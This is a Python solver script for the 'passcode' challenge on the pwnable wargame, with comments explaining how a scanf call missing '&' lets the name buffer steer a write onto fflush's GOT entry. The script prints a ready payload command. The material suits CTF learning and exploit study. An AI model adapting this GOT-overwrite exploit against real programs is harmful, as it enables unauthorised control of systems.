'''
passcode from pwnable - solver + explanation
'''

GOT_address_for_fflush = 0x804a004
login_success_flow = 0x080485e3

'''
The code calls scanf like so:

int passcode1;

scanf("%d", passcode1); --> with no "&"

so scanf will try to access *passcode1 and write the number there.
the value in this point in time of passcode1 is the
last 4 chars in "name" ("name" is a string of length 100 that we are required to insert before the scanf)

so the exploit will write the address of the fflush in the GOT and will insert the address we want to jump to after
'''
print("Enter this in the ssh: ")
print("python -c \"import struct; print '1' * 96 + struct.pack('<I', 0x{:x}) + str(0x{:x})\" | ./passcode".format(GOT_address_for_fflush, login_success_flow))
